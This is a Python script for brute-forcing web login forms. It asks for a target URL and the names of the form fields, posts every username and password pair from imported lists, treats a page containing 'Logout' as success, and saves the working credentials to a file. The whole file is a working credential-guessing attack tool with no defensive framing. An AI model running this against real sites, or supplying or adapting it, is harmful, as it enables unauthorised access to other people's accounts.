from settings import *
import requests
from lxml import html
from sys import exit

def process_request(request, user, password, failed_aftertry):
    """
    This method will proceed the request

    Args:
        request:
        user:
        password:
        failed_aftertry:

    Returns:

    """
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            print("[+] Connection failed : Trying again ....")
            return
        else:
            failed_aftertry = failed_aftertry + 1
            print("[+] Connection failed : 404 Not Found (Verify your URL)")
    else:
        if "Login" in request.text:
            print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
        else:
            if "Logout" in request.text:
                result = "\n[+] --------------------------------------------------------------"
                result += "\n[+]\nThese Credentials succeed to Login:\n> username: " + user + " and " \
                                                                                                          "password: " \
                                                                                                          "" + password
                result += "\n[+] --------------------------------------------------------------\n"
                with open("./results.txt", "w+") as frr:
                    frr.write(result)
                print(
                    "[+] Match Found! with 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                          "./results.txt")
                exit()
            else:
                print("Trying these parameters: user: " + user + " and password: " + password)



def process_user(user, url, failed_aftertry, user_field, password_field):
    """[summary]
    Arguments:
        user {[type]} -- [description]
        url {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    for password in PASSWORDS:
        # Create the payload for the submission form
        payload = {
            user_field: user.replace('\n', ''),
            password_field: password.replace('\n', '')
        }
        print("[+]", payload)
        # Doing the post form
        request = requests.post(url, data=payload)

        process_request(request, user, password, failed_aftertry)


def try_connection(url, user_field, password_field):
    """[summary]

    Arguments:
        url {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    print("[+] Connecting to: " + url + "......\n")

    failed_aftertry = 0
    for user in USERS:
        process_user(user, url, failed_aftertry, user_field, password_field)


def manual_mode():

    # The link of the website
    url = input("\n[+] Enter the target URL: ")
    # The user_field in the form of the login
    user_field = input(
        "\n[+] Enter the username/email field: ")
    # The password_field in the form
    password_field = input(
        "\n[+] Enter the password field: ")

    try_connection(url, user_field, password_field)


def main():
    manual_mode()

